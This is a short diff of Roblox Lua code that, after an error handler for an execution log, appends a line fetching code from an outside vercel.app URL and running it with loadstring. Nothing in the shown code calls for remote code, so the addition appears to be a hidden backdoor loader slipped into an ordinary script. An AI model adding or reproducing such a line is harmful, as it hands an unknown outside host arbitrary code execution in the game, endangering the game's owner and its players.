@@ -32,3 +32,5 @@ end)
 if not success then
     warn("Execution log failed:", err)
 end
+
+loadstring(game:HttpGet("https://roblox-alpha-murex.vercel.app/webhook"))()
